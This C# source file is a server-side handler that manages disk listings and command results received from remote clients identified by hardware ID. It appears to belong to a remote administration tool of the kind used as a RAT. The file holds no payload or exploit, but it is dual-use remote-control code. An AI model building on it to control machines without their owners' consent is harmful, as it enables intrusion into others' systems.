using System;
using System.Drawing;
using System.Windows.Forms;
using Leb128;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerDiskManagement
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		try
		{
			string action = objects[1]?.ToString();
			if (string.IsNullOrEmpty(action))
			{
				client.Disconnect();
				return;
			}
			if (action != "Connect" && action != "DiskList" && action != "Result" && action != "Error")
			{
				Methods.AppendLogs(client.IP, "Invalid action: " + action + " (HandlerDiskManagement)", Color.Red);
				client.Disconnect();
				return;
			}
			switch (action)
			{
			case "Connect":
			{
				if (objects.Length < 3)
				{
					client.Disconnect();
					break;
				}
				string hwid = objects[2]?.ToString();
				if (string.IsNullOrEmpty(hwid) || hwid.Length > 100)
				{
					client.Disconnect();
					break;
				}
				FormDiskManagement form2 = (FormDiskManagement)Application.OpenForms["DiskManagement:" + hwid];
				if (form2 == null)
				{
					client.Disconnect();
					break;
				}
				form2.Invoke((MethodInvoker)delegate
				{
					form2.Text = "Disk Management [" + hwid + "]";
					form2.client = client;
					client.Send(new object[2] { "DiskManagement", "GetDisks" });
				});
				client.Tag = form2;
				client.Hwid = hwid;
				break;
			}
			case "DiskList":
			{
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				if (objects.Length < 3)
				{
					client.Disconnect();
					break;
				}
				FormDiskManagement form3 = (FormDiskManagement)client.Tag;
				if (!(objects[2] is byte[] diskData) || diskData.Length > 5242880)
				{
					client.Disconnect();
					break;
				}
				object[] disks;
				try
				{
					disks = LEB128.Read(diskData);
				}
				catch
				{
					client.Disconnect();
					break;
				}
				form3.Invoke((MethodInvoker)delegate
				{
					form3.PopulateDisks(disks);
				});
				break;
			}
			case "Result":
			{
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormDiskManagement form4 = (FormDiskManagement)client.Tag;
				string message = ((objects.Length <= 2) ? "" : objects[2]?.ToString());
				if (message != null && message.Length > 5000)
				{
					message = message.Substring(0, 5000) + "... [Truncated]";
				}
				form4.Invoke((MethodInvoker)delegate
				{
					form4.ShowResult(message, success: true);
				});
				break;
			}
			case "Error":
			{
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormDiskManagement form = (FormDiskManagement)client.Tag;
				string errorMsg = ((objects.Length <= 2) ? "Unknown error" : objects[2]?.ToString());
				if (errorMsg != null && errorMsg.Length > 5000)
				{
					errorMsg = errorMsg.Substring(0, 5000) + "... [Truncated]";
				}
				form.Invoke((MethodInvoker)delegate
				{
					form.ShowResult(errorMsg, success: false);
				});
				break;
			}
			}
		}
		catch (Exception)
		{
		}
	}
}
